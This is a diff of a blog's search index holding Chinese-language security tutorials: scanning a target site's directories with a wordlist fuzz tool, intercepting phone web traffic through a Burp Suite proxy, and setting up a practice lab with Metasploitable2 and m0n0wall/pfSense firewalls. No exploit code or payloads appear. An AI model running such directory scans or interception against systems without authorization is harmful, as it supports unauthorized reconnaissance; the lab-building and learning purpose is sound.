+<li>出现可视化窗口，现在我们先填写需要扫描的目标网站url地址<br> <img data-src="https://s4.ax1x.com/2021/12/29/Tgf7gP.png" alt="Tgf7gP.png"></li>
+<li>第二个输入框需要我们选择使用的字典，点击<code>browse</code> 按钮查找，并指定字典，具体流程如下图：<br> <img data-src="https://s4.ax1x.com/2021/12/29/Tgfqu8.png" alt="Tgfqu8.png"></li>
+<li>点击<code>URL Fuzz</code>，在最下方的输入框追加上{dir}<br> <img data-src="https://s4.ax1x.com/2021/12/29/TgfOHg.png" alt="TgfOHg.png"></li>
+<li>点击<code>start</code> 开始扫描<br> <img data-src="https://s4.ax1x.com/2021/12/29/TgfvNj.png" alt="TgfvNj.png"></li>
+<li>点击第二个窗口，可以查看扫描出来的结果，从response响应上来看，返回值200的路径应该是可以访问的<br> <img data-src="https://s4.ax1x.com/2021/12/29/Tgh9g0.png" alt="Tgh9g0.png"></li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后续访问的内容就不做演示了，扫描的结果和准确度，还是取决于使用的字典是否强大,另外还可以设置较大的线程数来加快扫描速度，这取决于使用者的电脑性能是否强大。</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>扫描技术</tag>
       </tags>
   </entry>
   <entry>
     <title>如何抓取手机的web数据包</title>
     <url>/2021/12/29/%E5%A6%82%E4%BD%95%E6%8A%93%E5%8F%96%E6%89%8B%E6%9C%BAweb%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
     <content><![CDATA[<h1 id="如何抓取手机的web数据包"><a href="#如何抓取手机的web数据包" class="headerlink" title="如何抓取手机的web数据包"></a>如何抓取手机的web数据包</h1><ol>
-<li>首先使用ipconfig命令查看自己的内网ip地址<br> <img data-src="https://s4.ax1x.com/2021/12/29/TccHtP.png" alt="TccHtP.png">]</li>
-<li>在手机模拟器中找到WLAN的默认wifi长按选择<code>修改网络</code><br> <img data-src="https://s4.ax1x.com/2021/12/29/TcgKtx.png" alt="TcgKtx.png">] <span id="more"></span></li>
-<li>代理服务器主机名填写自己的内网ip地址<br> 代理服务器端口填写 Burpsuite设置的监听端口<br> <img data-src="https://s4.ax1x.com/2021/12/29/Tcg3cD.png" alt="Tcg3cD.png">]</li>
-<li>Burpsuite的<code>proxy</code>模块修改成和上面一致<br> <img data-src="https://s4.ax1x.com/2021/12/29/TcgaNt.png" alt="TcgaNt.png">]<br> <img data-src="https://s4.ax1x.com/2021/12/29/Tcgrjg.png" alt="Tcgrjg.png">]</li>
+<li>首先使用ipconfig命令查看自己的内网ip地址<br> <img data-src="https://s4.ax1x.com/2021/12/29/TccHtP.png" alt="TccHtP.png"></li>
+<li>在手机模拟器中找到WLAN的默认wifi长按选择<code>修改网络</code><br> <img data-src="https://s4.ax1x.com/2021/12/29/TcgKtx.png" alt="TcgKtx.png"> <span id="more"></span></li>
+<li>代理服务器主机名填写自己的内网ip地址<br> 代理服务器端口填写 Burpsuite设置的监听端口<br> <img data-src="https://s4.ax1x.com/2021/12/29/Tcg3cD.png" alt="Tcg3cD.png"></li>
+<li>Burpsuite的<code>proxy</code>模块修改成和上面一致<br> <img data-src="https://s4.ax1x.com/2021/12/29/TcgaNt.png" alt="TcgaNt.png"><br> <img data-src="https://s4.ax1x.com/2021/12/29/Tcgrjg.png" alt="Tcgrjg.png"></li>
 <li>用模拟器随机访问一些web页面<br> Burpsuite能够抓取到数据包，配置成功<br> <img data-src="https://s4.ax1x.com/2021/12/29/Tcg6Bj.png" alt="Tcg6Bj.png"></li>
 </ol>
 <p>手机同理</p>
@@ -981,7 +1146,7 @@ HandleLidSwitch 合上笔记本盖后的行为，默认suspend
         <category>Burpsuite</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
         <tag>Burpsuite</tag>
       </tags>
   </entry>
@@ -1006,10 +1171,10 @@ HandleLidSwitch 合上笔记本盖后的行为，默认suspend
 </li>
 <li>Metasploitable2<ul>
 <li><a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a></li>
-<li><code>msfadmin</code> 默认账号和密码<br>  <a href="https://imgtu.com/i/TBnwX8"><img data-src="https://s4.ax1x.com/2021/12/27/TBnwX8.png" alt="TBnwX8.png"></a></li>
+<li><code>msfadmin</code> 默认账号和密码<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnwX8.png" alt="TBnwX8.png"></li>
 <li>问题: <code>/var/www/mutillidae/config.inc</code><ul>
 <li><code>sudo vim /var/www/mutillidae/config.inc</code></li>
-<li><code>dbname=owasp10</code> 修改数据库连接<br>  <a href="https://imgtu.com/i/TBnETJ"><img data-src="https://s4.ax1x.com/2021/12/27/TBnETJ.png" alt="TBnETJ.png"></a></li>
+<li><code>dbname=owasp10</code> 修改数据库连接<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnETJ.png" alt="TBnETJ.png"></li>
 </ul>
 </li>
 </ul>
@@ -1022,19 +1187,19 @@ HandleLidSwitch 合上笔记本盖后的行为，默认suspend
 <hr>
 <h2 id="模拟真实网络"><a href="#模拟真实网络" class="headerlink" title="模拟真实网络"></a>模拟真实网络</h2><ul>
 <li>vm添加3块虚拟网卡</li>
-<li>vm 添加两个虚拟网络（仅主机）不启用dhcp<br>  <a href="https://imgtu.com/i/TBnAw4"><img data-src="https://s4.ax1x.com/2021/12/27/TBnAw4.png" alt="TBnAw4.png"></a></li>
+<li>vm 添加两个虚拟网络（仅主机）不启用dhcp<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnAw4.png" alt="TBnAw4.png"></li>
 <li><code>M0n0wall</code> 防火墙<ul>
-<li><a href="http://m0n0.ch/wall/downloads.php">http://m0n0.ch/wall/downloads.php</a><br>  <a href="https://ia803100.us.archive.org/19/items/generic-pc-1.8.1/generic-pc-1.8.1.iso">https://ia803100.us.archive.org/19/items/generic-pc-1.8.1/generic-pc-1.8.1.iso</a><br>  <a href="https://imgtu.com/i/TBneYR"><img data-src="https://s4.ax1x.com/2021/12/27/TBneYR.png" alt="TBneYR.png"></a></li>
+<li><a href="http://m0n0.ch/wall/downloads.php">http://m0n0.ch/wall/downloads.php</a><br>  <a href="https://ia803100.us.archive.org/19/items/generic-pc-1.8.1/generic-pc-1.8.1.iso">https://ia803100.us.archive.org/19/items/generic-pc-1.8.1/generic-pc-1.8.1.iso</a><br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBneYR.png" alt="TBneYR.png"></li>
 <li>体积非常小，甚至可以装在<code>arm</code>架构的机器里当作企业的真实防火墙</li>
 <li>学习研究可以装在树莓里</li>
-<li>安装<br>  vm 网络设置如图 启用前3块<br>  <a href="https://imgtu.com/i/TBnkmF"><img data-src="https://s4.ax1x.com/2021/12/27/TBnkmF.png" alt="TBnkmF.png"></a><br>  <a href="https://imgtu.com/i/TBnPyT"><img data-src="https://s4.ax1x.com/2021/12/27/TBnPyT.png" alt="TBnPyT.png"></a><br>  <a href="https://imgtu.com/i/TBnZk9"><img data-src="https://s4.ax1x.com/2021/12/27/TBnZk9.png" alt="TBnZk9.png"></a>  <a href="https://imgtu.com/i/TBnmf1"><img data-src="https://s4.ax1x.com/2021/12/27/TBnmf1.png" alt="TBnmf1.png"></a><br>  第二次断开硬盘<br>  <a href="https://imgtu.com/i/TBnuSx"><img data-src="https://s4.ax1x.com/2021/12/27/TBnuSx.png" alt="TBnuSx.png"></a>  <a href="https://imgtu.com/i/TBnKl6"><img data-src="https://s4.ax1x.com/2021/12/27/TBnKl6.png" alt="TBnKl6.png"></a><br>  <a href="https://imgtu.com/i/TBnM6K"><img data-src="https://s4.ax1x.com/2021/12/27/TBnM6K.png" alt="TBnM6K.png"></a>  <a href="https://imgtu.com/i/TBn1mD"><img data-src="https://s4.ax1x.com/2021/12/27/TBn1mD.png" alt="TBn1mD.png"></a><br>  设置 <code>LAN</code> 口，<code>WAN</code> 口<br>  <a href="https://imgtu.com/i/TBnQOO"><img data-src="https://s4.ax1x.com/2021/12/27/TBnQOO.png" alt="TBnQOO.png"></a><br>  <a href="https://imgtu.com/i/TBn30e"><img data-src="https://s4.ax1x.com/2021/12/27/TBn30e.png" alt="TBn30e.png"></a><br>  配置好后 y 自动重启<br>  配置 ip 根据  vm虚拟网络设置配置<br>  <a href="https://imgtu.com/i/TBnJkd"><img data-src="https://s4.ax1x.com/2021/12/27/TBnJkd.png" alt="TBnJkd.png"></a><br>  接下来重新设置<code>web</code> 登录的密码<br>  <a href="https://imgtu.com/i/TBnYtA"><img data-src="https://s4.ax1x.com/2021/12/27/TBnYtA.png" alt="TBnYtA.png"></a><br>  配置好 打开浏览器访问<br>  <a href="https://imgtu.com/i/TBn8TH"><img data-src="https://s4.ax1x.com/2021/12/27/TBn8TH.png" alt="TBn8TH.png"></a><br>  登陆进去首先配置<code>OPT1</code> 接口<br>  IP地址是根据，第二个网卡来配置的<br>  保存<br>  <a href="https://imgtu.com/i/TBntfI"><img data-src="https://s4.ax1x.com/2021/12/27/TBntfI.png" alt="TBntfI.png"></a><br>  配置防火墙 规则<br>  <a href="https://imgtu.com/i/TBnUpt"><img data-src="https://s4.ax1x.com/2021/12/27/TBnUpt.md.png" alt="TBnUpt.md.png"></a>  <a href="https://imgtu.com/i/TBna1P"><img data-src="https://s4.ax1x.com/2021/12/27/TBna1P.png" alt="TBna1P.png"></a><br>  配置<code>WAN</code> 口<pre><code>  [![TBnd6f.png](https://s4.ax1x.com/2021/12/27/TBnd6f.png)](https://imgtu.com/i/TBnd6f)
+<li>安装<br>  vm 网络设置如图 启用前3块<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnkmF.png" alt="TBnkmF.png"><br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnPyT.png" alt="TBnPyT.png"><br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnZk9.png" alt="TBnZk9.png">  <img data-src="https://s4.ax1x.com/2021/12/27/TBnmf1.png" alt="TBnmf1.png"><br>  第二次断开硬盘<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnuSx.png" alt="TBnuSx.png">  <img data-src="https://s4.ax1x.com/2021/12/27/TBnKl6.png" alt="TBnKl6.png"><br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnM6K.png" alt="TBnM6K.png">  <img data-src="https://s4.ax1x.com/2021/12/27/TBn1mD.png" alt="TBn1mD.png"><br>  设置 <code>LAN</code> 口，<code>WAN</code> 口<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnQOO.png" alt="TBnQOO.png"><br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBn30e.png" alt="TBn30e.png"><br>  配置好后 y 自动重启<br>  配置 ip 根据  vm虚拟网络设置配置<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnJkd.png" alt="TBnJkd.png"><br>  接下来重新设置<code>web</code> 登录的密码<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnYtA.png" alt="TBnYtA.png"><br>  配置好 打开浏览器访问<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBn8TH.png" alt="TBn8TH.png"><br>  登陆进去首先配置<code>OPT1</code> 接口<br>  IP地址是根据，第二个网卡来配置的<br>  保存<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBntfI.png" alt="TBntfI.png"><br>  配置防火墙 规则<br>  <img data-src="https://s4.ax1x.com/2021/12/27/TBnUpt.md.png" alt="TBnUpt.md.png">  <img data-src="https://s4.ax1x.com/2021/12/27/TBna1P.png" alt="TBna1P.png"><br>  配置<code>WAN</code> 口<pre><code>  [![TBnd6f.png](https://s4.ax1x.com/2021/12/27/TBnd6f.png)
 </code></pre>
 </li>
 </ul>
 </li>
 <li>背靠背防火墙<ul>
 <li><code>Pfsense</code> <ul>
-<li><a href="https://pfsense.org/">https://pfsense.org/</a><br><a href="https://imgtu.com/i/TBnD0g"><img data-src="https://s4.ax1x.com/2021/12/27/TBnD0g.png" alt="TBnD0g.png"></a></li>
+<li><a href="https://pfsense.org/">https://pfsense.org/</a><br><img data-src="https://s4.ax1x.com/2021/12/27/TBnD0g.png" alt="TBnD0g.png"></li>
 <li>安装和 <code>m0n0wall</code> 类似</li>
 <li>属于高安全防护的企业防火墙架构</li>
 </ul>
@@ -1044,9 +1209,10 @@ HandleLidSwitch 合上笔记本盖后的行为，默认suspend
 </ul>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>网络安全</category>
       </categories>
       <tags>
+        <tag>网络安全</tag>
         <tag>渗透</tag>
       </tags>
   </entry>
@@ -1140,10 +1306,10 @@ HandleLidSwitch 合上笔记本盖后的行为，默认suspend
 <h2 id="挖掘漏洞代码审计与脚本类型的关系？"><a href="#挖掘漏洞代码审计与脚本类型的关系？" class="headerlink" title="挖掘漏洞代码审计与脚本类型的关系？"></a>挖掘漏洞代码审计与脚本类型的关系？</h2><p>同上</p>
 ]]></content>
       <categories>
-        <category>网络</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
       </tags>
   </entry>
 </search>
